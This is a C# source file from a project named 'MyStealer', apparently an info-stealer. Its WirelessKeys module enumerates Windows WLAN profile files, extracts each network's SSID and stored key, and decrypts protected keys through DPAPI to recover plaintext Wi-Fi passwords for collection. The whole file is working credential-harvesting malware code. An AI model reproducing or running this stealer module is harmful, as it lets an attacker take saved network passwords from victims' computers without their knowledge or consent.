using MyStealer.Collector.Utils;
using Serilog;
using System;
using System.Collections.Immutable;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml.Linq;

namespace MyStealer.Collector.Modules.System
{
    /// <summary>
    /// https://securityxploded.com/wifi-password-secrets.php
    /// </summary>
    public class WirelessKeys
    {
        public const string ApplicationName = "Wireless LAN Keys";

        public ILogger logger = LogExt.ForModule(ApplicationName);

        public IImmutableSet<WirelessProfile> GetCredentials()
        {
            var path = Path.Combine(Environment.GetEnvironmentVariable("ProgramData"), "Microsoft", "WlanSvc");
            if (!Directory.Exists(path))
            {
                logger.Warning("Path {path} is not found.", path);
                return ImmutableHashSet<WirelessProfile>.Empty;
            }

            var builder = ImmutableHashSet.CreateBuilder<WirelessProfile>();

            foreach (var guidFolder in Directory.EnumerateDirectories(Path.Combine(path, "Interfaces")))
            {
                foreach (var profileFile in Directory.EnumerateFiles(guidFolder, "*.xml", SearchOption.TopDirectoryOnly))
                {
                    try
                    {
                        var doc = XDocument.Load(profileFile).Root;
                        var ssid = doc.Element("SSIDConfig")?.Element("SSID")?.Element("name")?.Value;
                        if (string.IsNullOrEmpty(ssid))
                            continue;

                        var security = doc.Element("MSM").Element("security");

                        var authEncryption = security.Element("authEncryption");
                        var secProtocol = authEncryption.Element("authentication").Value + '-' + authEncryption.Element("encryption").Value;

                        var sharedKey = security.Element("sharedKey");
                        var isProtected = bool.Parse(sharedKey.Element("protected").Value);
                        var key = sharedKey.Element("keyMaterial").Value;

                        if (isProtected)
                        {
                            var buffer = HexString.HexToBytes(key);
                            var decrypted = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                            key = Encoding.UTF8.GetString(decrypted);
                        }

                        builder.Add(new WirelessProfile
                        {
                            Security = secProtocol,
                            SSID = ssid,
                            Password = key
                        });
                    }
                    catch (Exception ex)
                    {
                        logger.Warning(ex, "Error parsing wlan profile {path}.", profileFile);
                    }
                }
            }

            return builder.ToImmutable();
        }
    }
}
